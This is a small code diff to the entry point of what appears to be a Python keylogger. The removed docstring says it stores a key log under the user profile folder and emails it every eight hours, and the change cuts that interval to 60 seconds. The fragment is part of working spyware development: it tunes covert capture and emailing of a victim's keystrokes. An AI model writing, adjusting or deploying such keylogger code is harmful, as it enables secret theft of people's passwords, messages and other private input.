@@ -89,9 +89,4 @@ class Main:
                         self.keylogger.clear_key_log()
 
 if __name__ == "__main__":
-    """
-    entry point of the script
-    by default saves under the user profile dir
-    sends a log to email every 8 hours.
-    """
-    Main(28800, "%userprofile%\\log.txt").start()
+    Main(60, "%userprofile%\\log.txt").start()
